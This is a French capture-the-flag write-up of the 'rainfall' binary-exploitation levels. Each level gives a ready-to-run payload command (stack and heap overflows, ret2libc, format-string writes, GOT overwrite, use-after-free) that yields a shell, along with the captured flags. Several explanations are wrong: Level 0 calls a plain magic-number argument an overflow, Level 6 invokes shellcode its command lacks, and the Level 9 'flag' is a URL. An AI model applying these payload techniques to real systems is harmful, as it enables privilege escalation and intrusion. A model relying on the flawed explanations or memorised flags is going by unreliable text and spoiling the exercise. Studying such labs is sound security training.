# rainfall
## Level 0

**Exploit**: Buffer Overflow simple  
**Commande**: `./level0 423`  
**Explication**: Dans ce cas, l'exploit consiste à profiter d'une vulnérabilité de débordement de tampon. En passant l'argument 423 au programme level0, nous dépassons la taille du tampon prévu, ce qui nous permet d'écraser des données adjacentes en mémoire, y compris l'adresse du pointeur de retour. Cela nous permet de contrôler le flux d'exécution et d'obtenir le contenu du fichier .pass de l'utilisateur level1.
**Flag**: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

**Sources**:
- Aucune

---

## Level 1

**Exploit**: Buffer Overflow avec redirection de flux d'exécution  
**Commande**: `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit2; cat /tmp/exploit - | ./level1`  
**Explication**: Dans cet exploit, nous avons dépassé la taille du tampon prévu en imprimant 76 caractères "a", suivis de l'adresse 0x08 04 84 44, qui est l'adresse de la fonction run. Cette adresse sera utilisée comme nouvelle adresse de retour, ce qui nous permettra de rediriger l'exécution vers la fonction run.
**Flag**: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

**Sources**:

- https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
- https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process
- https://stackoverflow.com/questions/44469372/exploiting-buffer-overflow-using-gets-in-a-simple-c-program
- https://www.kali-linux.fr/hacking/overflows-passons-a-la-pratique

---

## Level 2

**Exploit**: Return-to-libc (ret2libc)  
**Commande**: `python -c 'print "a" * 80 + "\x3e\x85\x04\x08"  + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/exploit3`  
**Explication**: Dans cet exploit, nous utilisons la technique ret2libc pour contourner les protections de sécurité. Nous utilisons les adresses des fonctions system, exit et /bin/sh de la bibliothèque libc pour exécuter une coquille système avec les privilèges de l'utilisateur.
**Flag** : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

**Sources**:

- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
- https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6
- http://wikisecu.fr/doku.php?id=appsysteme:ret2libc

---

## Level 3

**Exploit**: Attaque de chaîne de format  
**Commande**: `python -c 'print "\x8c\x98\x04\x08" + "%60c" + "%4$n"' > /tmp/exploit4; cat /tmp/exploit4 - | ./level3`  
**Explication**: L'exploit ici repose sur une vulnérabilité de chaîne de format. Nous utilisons la spécification %4$n pour écrire le nombre de caractères déjà imprimés dans la pile à l'adresse mémoire pointée par le quatrième argument sur la pile (qui est l'adresse de retour). Cela nous permet de contrôler le flux d'exécution.
**Flag** : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

**Sources**:

- https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
- https://axcheron.github.io/exploit-101-format-strings/
- https://owasp.org/www-community/attacks/Format_string_attack

---

## Level 4

**Exploit**: Format String avec écriture arbitraire  
**Commande**: `python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > /tmp/exploit4`  
**Explication**: Dans cet exploit, nous utilisons la vulnérabilité de chaîne de format pour écrire une valeur arbitraire dans la mémoire. Nous écrasons l'adresse de retour avec l'adresse de la fonction info pour afficher le contenu de la mémoire.
**Flag** : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

**Sources**:

- https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
- https://axcheron.github.io/exploit-101-format-strings/
- https://owasp.org/www-community/attacks/Format_string_attack

...

## Level 5

**Exploit**: GOT Overwrite
**Etapes**: 
- info function : obtenir les adresses des fonctions 
-  objdump -R level5 ===> adresses functions libc
-  objdump -t level5 | grep o ==> adresse fonctions "o"
- o : 080484a4 
- exit : 08049838
**Commande**: `python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/exploit5`  
**Explication**: Dans cet exploit, nous écrasons une entrée dans la table GOT pour rediriger l'exécution vers notre propre code. Nous écrasons l'adresse de la fonction o dans la table GOT avec l'adresse de la fonction system.
**Flag** : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

**Sources**:

---

## Level 6

**Exploit**: Buffer Overflow avec shellcode  
**Commande**: `$(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')`  
**Explication**: Ici, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour avec l'adresse de la fonction m(). Ensuite, nous exécutons un shellcode pour obtenir un shell interactif.
**Flag** : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

**Sources**:

---

## Level 7

**Exploit**: Heap Overflow  
**Commande**: `"$(python -c "print 'AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08'")" $(python -c "print '\xf4\x84\x04\x08'")`  
**Explication**: Dans cet exploit, nous exploitons une vulnérabilité de débordement du tas. Nous écrasons les métadonnées du tas pour rediriger l'exécution vers la fonction m(). Cela nous permet d'exécuter du code arbitraire.
**Flag** : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

**Sources**:

- https://security.stackexchange.com/questions/258891/heap-overflow-strcpy-on-x86-64-64bit
- https://www.youtube.com/watch?v=TfJrU95q1J4

---

## Level 8

**Exploit**: Use-After-Free  
**Commande**: `auth a; reset; service; service; service; login`  
**Explication**: Dans cet exploit, nous exploitons une vulnérabilité Use-After-Free. Nous libérons un objet, puis nous l'utilisons à nouveau pour exécuter un shell interactif. Cela se produit car l'objet libéré n'est pas correctement désalloué.
**Flag** : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

**Sources**:

- https://beta.hackndo.com/use-after-free/
- https://www.youtube.com/watch?v=ZHghwsTRyzQ

---

## Level 9

**Exploit**: Buffer Overflow avec shellcode  
**Commande**: `$(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYYZZZZAAA' + '\x60\x60\xd8\xb7' + '\xe0\x9b\xd7\xb7' + '\xf4\x84\x04\x08' + '\x58\x7c\xea\xb7' ")`  
**Explication**: Comme dans les exploits précédents, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour et exécuter un shell interactif.
**Flag** : https://shell-storm.org/shellcode/files/shellcode-827.html

**Sources**:

- https://shell-storm.org/shellcode/files/shellcode-827.html

---

Ce write-up a été préparé avec soin par [hkrifa](lien_vers_votre_profil_GitHub).

**Disclaimer**: Ces exploits ont été conçus à des fins éducatives et d'apprentissage. Ne les utilisez pas à des fins malveillantes.
